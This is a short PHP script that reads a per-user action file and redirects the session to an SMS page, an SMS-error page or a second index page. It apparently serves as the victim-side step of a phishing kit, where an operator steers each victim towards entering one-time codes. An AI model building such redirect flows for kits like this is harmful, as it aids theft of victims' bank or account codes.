<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['usuario'])) exit;

$usuario = $_SESSION['usuario'];
$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $destino = trim(file_get_contents($archivo));
    unlink($archivo); // eliminamos después de usar

    // Solo redirige si el contenido es un archivo válido
    if (in_array($destino, ['sms.php', 'smserror.php', 'index2.php'])) {
        header("Location: $destino");
        exit;
    }
}
?>
